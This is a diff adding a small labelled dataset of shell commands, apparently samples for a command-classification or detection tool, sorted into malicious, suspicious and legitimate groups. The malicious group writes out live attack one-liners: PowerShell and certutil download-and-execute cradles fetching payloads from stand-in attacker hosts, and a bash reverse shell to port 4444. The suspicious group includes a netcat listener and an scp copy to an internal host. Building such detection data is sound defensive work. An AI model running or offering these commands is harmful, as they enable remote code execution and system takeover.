@@ -1,0 +1,36 @@
+//malicious
+powershell -encodedCommand
+powershell -e JAB
+curl http://malicious.example.com/payload.sh
+wget http://attacker.site/backdoor.py
+certutil -urlcache -split -f http://192.168.1.100/mal.exe
+Invoke-WebRequest -Uri http://dangerous.site/script.ps1
+Invoke-Expression (New-Object Net.WebClient).DownloadString('http://exploit.com/cmd.txt')
+bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
+cmd /c "start http://phishing.site/login"
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"
+
+//suspicious
+curl http://example.com
+wget http://updates.example.org/script.sh
+powershell Invoke-WebRequest -Uri http://internal-server/file.ps1
+scp file.txt user@192.168.1.10:/tmp/
+nc -lvp 4444
+python -m http.server 8000
+powershell -nop -w hidden
+cmd /c whoami
+curl -X POST -d "username=admin" http://test.site/login
+ftp ftp.example.com
+
+
+//legitimate
+echo "Hello, world!"
+ping google.com
+cd Documents
+mkdir new_folder
+dir
+ls -la
+notepad.exe
+whoami
+date /T
+python script.py
